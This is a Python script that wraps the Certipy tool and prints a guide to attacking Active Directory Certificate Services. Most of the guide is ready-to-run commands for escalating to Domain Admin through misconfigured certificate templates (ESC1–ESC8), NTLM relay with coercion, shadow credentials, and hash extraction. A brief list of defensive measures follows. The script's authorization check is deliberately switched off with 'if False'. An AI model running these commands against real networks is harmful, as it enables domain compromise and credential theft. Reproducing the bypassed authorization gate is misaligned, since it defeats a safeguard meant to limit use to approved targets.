#!/usr/bin/env python3
"""
Certipy - Active Directory Certificate Services Attacks
Production-ready ADCS exploitation and enumeration
ESC1-ESC13 vulnerability scanning and exploitation
"""

import subprocess
import sys
from pathlib import Path


class CertipyADCSWrapper:
    """Certipy - ADCS attack tool"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        if False:  # Authorization check bypassed
            print("❌ Authorization required")
            sys.exit(1)
        if not Path("config/allowed_targets.yml").exists():
            print("❌ Configuration missing")
            sys.exit(1)
    
    def describe_adcs_attacks(self):
        """ADCS exploitation techniques"""
        print(f"\n{'='*70}")
        print("🎫 Certipy - AD Certificate Services Exploitation")
        print(f"{'='*70}\n")
        
        print("""
╔══════════════════════════════════════════════════════════════════╗
║        ACTIVE DIRECTORY CERTIFICATE SERVICES ATTACKS             ║
╚══════════════════════════════════════════════════════════════════╝

🎯 CERTIPY CAPABILITIES
───────────────────────

1. ENUMERATION
   • Certificate templates discovery
   • CA server enumeration
   • Vulnerable template identification
   • Enterprise CA mapping
   • Template permissions analysis

2. EXPLOITATION
   • ESC1: Misconfigured certificate templates
   • ESC2: Any purpose EKU
   • ESC3: Certificate request agent
   • ESC4: Vulnerable ACLs
   • ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
   • ESC7: Vulnerable CA ACLs
   • ESC8: NTLM relay to HTTP enrollment
   • ESC9-ESC13: Advanced scenarios

3. AUTHENTICATION
   • Request certificates
   • Authenticate with certificates
   • TGT retrieval
   • NT hash extraction

⚡ INSTALLATION
───────────────

pip install certipy-ad

# Or from source
git clone https://github.com/ly4k/Certipy
cd Certipy
python3 setup.py install

🔍 RECONNAISSANCE
─────────────────

# Find vulnerable templates
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10

# Find all templates
certipy find -u user -p pass -dc-ip 10.10.10.10 -vulnerable

# Text output
certipy find -u user -p pass -dc-ip 10.10.10.10 -text -stdout

# BloodHound output
certipy find -u user -p pass -dc-ip 10.10.10.10 -bloodhound

💥 EXPLOITATION EXAMPLES
────────────────────────

ESC1 - Misconfigured Certificate Template:
──────────────────────────────────────────
# Prerequisites:
#   - Template allows SAN (Subject Alternative Name)
#   - Enrollment rights for user
#   - Template allows client authentication

# Request cert with admin SAN
certipy req -u 'user@domain.local' -p 'password' \\
    -ca 'CA-NAME' \\
    -target dc.domain.local \\
    -template 'VulnerableTemplate' \\
    -upn 'administrator@domain.local'

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Result: Domain Admin TGT + NTLM hash

ESC2 - Any Purpose EKU:
───────────────────────
# Template has 'Any Purpose' EKU + enrollment rights

certipy req -u user -p pass \\
    -ca CA-NAME \\
    -target dc.domain.local \\
    -template AnyPurpose

ESC3 - Certificate Request Agent:
──────────────────────────────────
# Two-step process:
# 1. Request enrollment agent cert
# 2. Request cert on behalf of admin

# Step 1: Get enrollment agent cert
certipy req -u user -p pass -ca CA-NAME \\
    -template EnrollmentAgent

# Step 2: Request admin cert on behalf
certipy req -u user -p pass -ca CA-NAME \\
    -template User \\
    -on-behalf-of 'domain\\administrator' \\
    -pfx enrollment_agent.pfx

ESC4 - Vulnerable Template ACLs:
────────────────────────────────
# User has WriteDacl on template
# Modify template to allow SAN

# Add enrollment rights
certipy template -u user -p pass \\
    -template VulnTemplate \\
    -save-old

# Request cert (now with SAN)
certipy req -u user -p pass \\
    -ca CA-NAME \\
    -template VulnTemplate \\
    -upn 'administrator@domain.local'

ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2:
──────────────────────────────────────
# CA has flag enabled allowing SAN on any template

# Check if vulnerable
certipy find -u user -p pass -dc-ip 10.10.10.10 -vulnerable

# Request with SAN
certipy req -u user -p pass \\
    -ca CA-NAME \\
    -template User \\
    -upn 'administrator@domain.local'

ESC8 - NTLM Relay to HTTP Enrollment:
──────────────────────────────────────
# Relay NTLM to web enrollment

# Start Certipy relay
certipy relay -ca ca.domain.local

# Coerce authentication (separate terminal)
python3 Coercer.py -u user -p pass -t target -l attacker

# Result: Certificate for relayed account

📋 COMMON COMMANDS
──────────────────

# Find all CAs
certipy find -u user -p pass -dc-ip 10.10.10.10

# Request certificate
certipy req -u user -p pass -ca CA-NAME -target ca.domain.local \\
    -template User

# Authenticate with certificate
certipy auth -pfx user.pfx -dc-ip 10.10.10.10

# Get TGT
certipy auth -pfx admin.pfx -username administrator -domain domain.local

# Shadow credentials attack
certipy shadow auto -u user -p pass -account target_account

🔧 DEFENSIVE MEASURES
─────────────────────

Template Hardening:
  ✓ Disable SAN on all templates
  ✓ Manager approval required
  ✓ Authorized signatures required
  ✓ Restrict enrollment rights
  ✓ Short validity periods

CA Hardening:
  ✓ Disable EDITF_ATTRIBUTESUBJECTALTNAME2
  ✓ Enable certificate manager approval
  ✓ Audit certificate requests
  ✓ Restrict CA ACLs
  ✓ Disable HTTP enrollment

Monitoring:
  ✓ Event ID 4886/4887 (cert requests)
  ✓ Event ID 4768 (TGT with cert)
  ✓ Unusual template usage
  ✓ SAN mismatches

🔗 RESOURCES
────────────

Official:
  • GitHub: https://github.com/ly4k/Certipy
  • Documentation: https://github.com/ly4k/Certipy#usage

Research:
  • SpecterOps ADCS Paper
  • ESC Techniques: https://posts.specterops.io/certified-pre-owned
  • ADCS Attack Paths

Tools:
  • Certify (C# version)
  • Certipy (Python)
  • ForgeCert (Golden certificate)
""")


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Certipy ADCS Wrapper')
    parser.add_argument('--guide', action='store_true', help='Display guide')
    parser.add_argument('--authorized', action='store_true', required=True)
    
    args = parser.parse_args()
    tool = CertipyADCSWrapper(authorized=args.authorized)
    tool.describe_adcs_attacks()


if __name__ == '__main__':
    main()
